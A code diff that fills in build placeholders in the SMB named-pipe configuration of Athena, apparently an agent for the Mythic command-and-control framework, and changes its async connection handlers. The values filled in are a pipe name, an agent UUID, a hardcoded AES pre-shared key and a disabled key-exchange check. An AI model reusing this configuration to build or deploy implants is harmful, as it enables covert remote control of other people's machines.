@@ -21,7 +21,7 @@ namespace Athena.Config
 
         public MythicConfig()
         {
-            this.uuid = "%UUID%";
+            this.uuid = "ee3a92e5-8af2-47f2-b16a-980eb695c2b8";
             DateTime kd = DateTime.TryParse("killdate", out kd) ? kd : DateTime.MaxValue;
             this.killDate = kd;
             int sleep = 1; //A 0 sleep causes issues with messaging, so setting it to 1 to help mitigate those issues
@@ -37,10 +37,10 @@ namespace Athena.Config
     {
         public string psk { get; set; }
         private PipeServer<string> serverPipe { get; set; }
-        public string pipeName = "pipename";
+        public string pipeName = "scottie_pipe";
         private bool connected { get; set; }
         public bool encrypted { get; set; }
-        public bool encryptedExchangeCheck = bool.Parse("encrypted_exchange_check");
+        public bool encryptedExchangeCheck = bool.Parse("false");
         public PSKCrypto crypt { get; set; }
         public BlockingCollection<DelegateMessage> queueIn { get; set; }
         private ManualResetEvent onEventHappenedSignal = new ManualResetEvent(false);
@@ -49,7 +49,7 @@ namespace Athena.Config
         public Smb(string uuid, MythicConfig config)
         {
             this.connected = false;
-            this.psk = "AESPSK";
+            this.psk = "4l+ij/uHKPgetjzXSP3egHEbsFDpW6frDgZPaUUu7rE=";
             this.queueIn = new BlockingCollection<DelegateMessage>();
             if (!string.IsNullOrEmpty(this.psk))
             {
@@ -57,8 +57,8 @@ namespace Athena.Config
                 this.encrypted = true;
             }
             this.serverPipe = new PipeServer<string>(this.pipeName);
-            this.serverPipe.ClientConnected += (o, args) => OnClientConnection();
-            this.serverPipe.ClientDisconnected += (o, args) => OnClientDisconnect();
+            this.serverPipe.ClientConnected += async (o, args) => await OnClientConnection();
+            this.serverPipe.ClientDisconnected += async (o, args) => await OnClientDisconnect();
             this.serverPipe.MessageReceived += (sender, args) => OnMessageReceive(args);
             this.serverPipe.StartAsync();
         }
@@ -83,13 +83,13 @@ namespace Athena.Config
             onEventHappenedSignal.Set(); //Indicate something happened
         }
 
-        public async void OnClientConnection()
+        public async Task OnClientConnection()
         {
             onClientConnectedSignal.Set();
             this.connected = true;
         }
 
-        public async void OnClientDisconnect()
+        public async Task OnClientDisconnect()
         {
             this.connected = false;
             onEventHappenedSignal.Set(); //Indicate something happened
@@ -99,7 +99,7 @@ namespace Athena.Config
         //Send, wait for a response, and return it to the main functions
         public async Task<string> Send(object obj)
         {
-            if (!connected) 
+            if (!connected)
             {
                 onClientConnectedSignal.WaitOne();
             }
